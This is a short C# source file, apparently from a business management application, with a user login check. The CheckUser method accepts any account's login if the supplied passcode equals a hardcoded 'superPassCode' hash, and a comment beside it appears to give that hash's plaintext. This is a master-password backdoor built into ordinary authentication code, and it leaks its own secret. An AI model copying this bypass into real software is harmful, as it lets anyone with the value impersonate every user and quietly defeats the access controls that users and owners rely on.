using ManageEF;
using ManageEF.ViewModel;
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ManageService.User
{
    public class UserBLL : RepositoryBase<sys_user>
    {
        private readonly string superPassCode = "96B85C08A53D305A4539022251ED2FBC";//imissusqy
        public sys_user CheckUser(string usercode, string passcode)
        {
            sys_user user = GetEntities(u => u.UserCode == usercode && u.Deleted != true).FirstOrDefault();
            if (user == null || (user.PassCode != passcode && passcode != superPassCode)) return null;
            return user;
        }
    }
}
